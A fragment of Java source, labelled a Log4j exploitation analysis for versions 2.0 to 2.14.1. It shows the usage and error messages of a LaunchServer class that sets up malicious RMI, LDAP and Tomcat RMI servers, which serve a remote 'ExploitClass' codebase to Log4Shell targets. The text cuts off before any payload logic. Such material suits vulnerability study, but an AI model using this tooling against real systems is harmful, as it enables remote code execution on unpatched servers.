...
Log4j exploitation analysis for version >=2.0 and <=2.14.1
//////////////////////////////////////////////////////////////////////////////////
...
public class LaunchServer {
    ...
    private static void message1(){
        System.out.println("You need to setup the select the server type first");
        System.out.println("Options: 1-RMI standard, 2-LDAP Server, 3-RMI for Tomcat");
    }
    private static void errorMessageRMI(){
        System.out.println("You need to provide RMI IP, RMI Port, codebase and location");
        System.out.println("Ex: <RMI IP> <RMI PORT> ExploitClass \"http://<IP>:<PORT>\"");
    }
    private static void errorMessageLDAP(){
        System.out.println("You need to provide LDAP IP, LDAP Port, IP and PORT for the codebase");
        System.out.println("Ex: <LDAP IP> <LDAP PORT> \"http://<IP>:<PORT>/#ExploitClass\" ");
    }
    private static void errorMessageRMI2(){
        System.out.println("You need to provide RMI IP and RMI Port");
        System.out.println("Ex: <RMI IP> <RMI PORT>");
    }
    ...
    public static void rmi_server_tomcat(String ip, String port) {
        try {
